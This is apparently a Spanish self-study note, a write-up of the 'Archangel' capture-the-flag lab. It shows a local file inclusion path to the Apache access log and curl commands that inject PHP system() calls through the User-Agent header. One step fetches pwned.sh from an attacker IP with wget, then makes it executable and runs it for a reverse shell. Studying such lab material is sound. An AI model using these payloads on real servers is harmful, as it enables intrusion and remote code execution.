---
title: "Log Poissoning"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

La máquina [[MAQUINA ARCHANGEL (Fuzzing, Local File Inclusion con wrappers, log poissoning y manipulación del PATH)]] tiene esta vulnerabilidad en esta ruta:
```python
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../././var/log/apache2/access.log
```
![[Pasted image 20230625161757.png]]
Por tanto, una vez visto esto, podemos intentar hacer un log poisoning, de tal forma que si probamos en ejecutar una petición con curl podemos inyectar texto dentro del apartado del user agent:
```bash
curl -s -X GET 'http://mafialive.thm' -H 'User-Agent:Pruebas'
```
![[Pasted image 20230706193634.png]]
Pero ahora si dentro del user-agent inyectamos un código php malicioso para ejecutar comandos, veremos que funciona:
```bash
curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('whoami'); ?>"
```
![[Pasted image 20230706193823.png]]
Una vez hecho esto, montamos un servidor http con python y nos compartimos un fichero para enviarnos una reverse shell:
![[Pasted image 20230706195814.png]]
![[Pasted image 20230706195824.png]]
Y entonces ahora ejecutamos el comando wget para obtener este archivo y después bash pwned.sh para ejecutarlo y recibir la reverse shell:
```bash
curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('wget http://10.8.100.91/pwned.sh'); ?>"

curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('chmod 777 pwned.sh'); ?>"

curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('bash pwned.sh'); ?>"
```
Una vez ejecutado lo anterior, refrescamos y habremos recibido la reverse shell:
![[Pasted image 20230706200246.png]]
Y habremos recibido la reverse shell:
![[Pasted image 20230706200000.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
